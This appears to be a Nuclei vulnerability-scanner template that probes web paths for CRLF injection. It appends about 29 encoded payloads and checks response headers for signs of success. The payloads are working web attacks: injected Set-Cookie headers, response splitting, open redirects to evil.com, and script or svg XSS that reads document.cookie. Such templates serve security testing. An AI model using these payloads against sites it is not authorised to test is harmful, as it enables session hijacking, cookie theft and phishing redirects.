id: crlf-injection-extended

info:
  name: CRLF Injection Extended Detection
  author: 4rt3f4kt
  severity: high
  description: Detects a wide range of CRLF injection vectors that can be exploited for header injection, response splitting, and XSS.
  reference:
    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
  tags: crlf, header-injection, response-splitting, xss
  metadata:
    max-request: 5

http:
  - method: GET
    escape:
      - "%%0a0aSet-Cookie:4rt3f4kt=hi"
      - "%0aSet-Cookie:4rt3f4kt=hi;"
      - "%0aSet-Cookie:4rt3f4kt=hi"
      - "%0d%0aLocation: http://evil.com"
      - "%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23"
      - "%0d%0a%0d%0a<script>alert('XSS')</script>;"
      - "%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e"
      - "%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('XSS');</script>"
      - "%0d%0aHost: {{Hostname}}%0d%0aCookie: 4rt3f4kt=hi%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: 4rt3f4kt=hi%0d%0a%0d%0a"
      - "%0d%0aLocation: www.evil.com"
      - "%0d%0aSet-Cookie:4rt3f4kt=hi;"
      - "%0aSet-Cookie:4rt3f4kt=hi"
      - "%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>"
      - "%23%0aSet-Cookie:4rt3f4kt=hi"
      - "%25%30%61Set-Cookie:4rt3f4kt=hi"
      - "%2e%2e%2f%0d%0aSet-Cookie:4rt3f4kt=hi"
      - "%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr"
      - "%3f%0d%0aLocation:%0d%0a4rt3f4kt-x:4rt3f4kt-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>"
      - "%5Cr%20Set-Cookie:4rt3f4kt=hi;"
      - "%5Cr%5Cn%20Set-Cookie:4rt3f4kt=hi;"
      - "%5Cr%5Cn%5CtSet-Cookie:4rt3f4kt%5Cr%5CtSet-Cookie:4rt3f4kt=hi;"
      - "%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:4rt3f4kt=hi;"
      - "%E5%98%8A%E5%98%8DLocation:www.evil.com"
      - "%E5%98%8D%E5%98%8ALocation:www.evil.com"
      - "%E5%98%8D%E5%98%8ASet-Cookie:4rt3f4kt=hi"
      - "%E5%98%8D%E5%98%8ASet-Cookie:4rt3f4kt=hi;"
      - "%u000ASet-Cookie:4rt3f4kt=hi;"
      - "www.evil.com/%2E%2E%2F%0D%0ASet-Cookie:4rt3f4kt=hi;"
      - "www.evil.com/%2F..%0D%0ASet-Cookie:4rt3f4kt=hi;"
    
    fuzzing:
      - part: path
        type: postfix
        mode: single
        fuzz:
          - "{{escape}}"

    stop-at-first-match: false
    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - '(?i)(location\s*:\s*(http[s]?:)?//?www\.evil\.com)'
          - '(?i)(set-cookie\s*:\s*4rt3f4kt\s*=\s*hi)'
          - '(?i)(4rt3f4kt-x\s*:\s*4rt3f4kt-x)'
      - type: status
        status:
          - 200
          - 201
          - 202
          - 204
          - 205
          - 206
          - 207
          - 301
          - 302
          - 307
          - 308
        condition: or